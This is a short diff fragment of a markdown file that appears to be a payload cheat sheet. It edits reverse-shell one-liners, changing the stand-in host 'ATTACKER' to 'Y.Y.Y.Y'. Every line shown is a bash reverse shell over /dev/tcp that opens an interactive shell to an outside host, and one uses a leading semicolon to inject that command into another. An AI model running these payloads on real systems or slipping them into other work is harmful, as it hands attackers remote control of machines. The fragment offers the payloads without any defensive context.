@@ -42,7 +42,7 @@ bash -c "bash -i >& /dev/tcp/Y.Y.Y.Y/4444 0>&1"
 ```
 
 ```bash
-; bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'
+; bash -c 'bash -i >& /dev/tcp/Y.Y.Y.Y/443 0>&1'
 ```
 
 ```sh
